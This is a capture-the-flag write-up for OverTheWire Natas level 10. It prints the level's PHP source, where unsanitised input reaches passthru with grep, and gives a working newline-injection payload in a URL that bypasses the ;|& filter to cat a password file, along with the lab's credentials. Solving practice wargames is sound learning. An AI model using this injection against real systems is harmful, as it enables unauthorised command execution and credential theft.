# Natas10 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas10
Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
URL: http://natas10.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.
- Here, we also do the same command injection as for natas9 but now inputs are filtered.

  ```
  <html>
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
  <body>
  <h1>natas10</h1>
  <div id="content">
  
  For security reasons, we now filter on certain characters<br/><br/>
  <form>
  Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
  </form>
  
  
  Output:
  <pre>
  <?
  $key = "";
  
  if(array_key_exists("needle", $_REQUEST)) {
      $key = $_REQUEST["needle"];
  }
  
  if($key != "") {
      if(preg_match('/[;|&]/',$key)) {
          print "Input contains an illegal character!";
      } else {
          passthru("grep -i $key dictionary.txt");
      }
  }
  ?>
  </pre>
  
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

- Basic payload from last level wont work, also here you have to input the payload into the URL.

- This one got me the password: `blah%0Acat /etc/natas_webpass/natas11`

  ```
  http://natas10.natas.labs.overthewire.org/?needle=blah%0Acat /etc/natas_webpass/natas11&submit=Search
  ```

- Now, natas11 password will be printed on the web app.

---

## 🏁 Password for the next level

`natas11 password is UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk `

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
